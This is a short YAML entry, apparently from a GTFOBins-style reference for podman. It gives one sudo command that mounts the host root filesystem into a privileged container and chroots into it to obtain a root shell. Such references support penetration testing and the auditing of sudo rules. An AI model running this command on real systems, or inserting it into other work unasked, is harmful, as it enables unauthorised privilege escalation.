---
functions:
  sudo:
    - description: The resulting is a root shell.
      code: sudo podman run --rm -it --privileged --volume /:/mnt alpine chroot /mnt sh
---
